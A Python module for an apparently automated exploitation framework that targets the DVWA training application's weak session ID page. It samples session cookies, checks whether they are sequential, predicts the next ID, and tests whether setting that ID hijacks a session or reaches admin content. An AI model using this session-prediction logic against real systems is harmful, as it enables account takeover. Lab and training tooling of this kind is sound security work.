"""Tier 2 weak session IDs agent."""

from __future__ import annotations

import re
from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import make_update, module_endpoint, normalize_security_level
from core.state import ExploitationState
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession


SESSION_RE = re.compile(r"dvwaSession=([^;\s]+)", re.IGNORECASE)


class WeakSessionAgent(BaseAgent):
    module_name = "weak_session"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()

    def check_prerequisites(self, state: ExploitationState) -> bool:
        return True

    @staticmethod
    def _extract_session_id(headers: Any) -> str | None:
        if headers is None:
            return None
        header_value = ""
        if hasattr(headers, "get"):
            header_value = headers.get("set-cookie", "") or headers.get("Set-Cookie", "")
        match = SESSION_RE.search(str(header_value))
        return match.group(1) if match else None

    @staticmethod
    def _is_sequential(values: list[str]) -> bool:
        if len(values) < 2 or not all(value.isdigit() for value in values):
            return False
        ints = [int(value) for value in values]
        return all(b - a == 1 for a, b in zip(ints, ints[1:]))

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/weak_id/")
        payload_set = self.payloads.get(self.module_name, level)

        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []
        tried_now: list[str] = []

        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        session_values: list[str] = []
        session = DVWASession(target_url)
        try:
            for i in range(3):
                tried_now.append(f"sample_{i}")
                response = session.get(endpoint)
                session_id = self._extract_session_id(getattr(response, "headers", None))
                if session_id:
                    session_values.append(session_id)

            if self._is_sequential(session_values):
                score = max(score, 1)
                confirmed.append("weak_session_confirmed")

                predicted = str(int(session_values[-1]) + 1)
                tried_now.append(f"predict:{predicted}")
                session.http.set_cookie("dvwaSession", predicted)
                verify = session.get(endpoint)
                verify_body = (verify.text or "").lower()
                returned_id = self._extract_session_id(getattr(verify, "headers", None))

                if returned_id == predicted:
                    score = max(score, 3)
                    if "session_hijack" not in confirmed:
                        confirmed.append("session_hijack")
                    outcomes.append("session_hijack")
                if returned_id == predicted and "admin" in verify_body:
                    score = 4
        except Exception:
            pass
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = WeakSessionAgent()


def weak_session_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
